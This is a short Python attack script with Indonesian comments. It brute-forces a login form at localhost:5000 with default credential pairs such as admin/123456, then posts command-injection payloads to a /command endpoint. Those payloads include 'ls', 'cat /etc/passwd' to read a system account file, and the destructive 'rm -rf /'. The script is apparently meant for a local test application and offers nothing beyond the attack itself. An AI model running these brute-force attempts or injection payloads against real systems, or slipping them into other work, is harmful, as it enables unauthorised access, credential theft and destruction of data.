import requests

# Target URL
target_url = "http://localhost:5000/login"

# Daftar kredensial untuk brute-force
credentials = [
    {"username": "admin", "password": "password"},
    {"username": "admin", "password": "123456"},
    {"username": "user", "password": "qwerty"}
]

def brute_force_login(url, creds):
    for cred in creds:
        response = requests.post(url, data=cred)
        print(f"Mencoba {cred['username']}:{cred['password']} - Status: {response.status_code}")
        if "berhasil" in response.text.lower():  # Ganti dengan respons sukses
            print(f"[+] Login berhasil dengan kredensial: {cred}")
            break

# Menjalankan brute-force
brute_force_login(target_url, credentials)

# Target URL
command_url = "http://localhost:5000/command"

# Perintah eksploitasi
payloads = [
    "ls",
    "cat /etc/passwd",
    "rm -rf /"
]

def test_command_injection(url, commands):
    for command in commands:
        response = requests.post(url, data={"command": command})
        print(f"Mengirim perintah: {command} - Status: {response.status_code}")
        print("Respons:", response.text)

# Menjalankan pengujian command injection
test_command_injection(command_url, payloads)

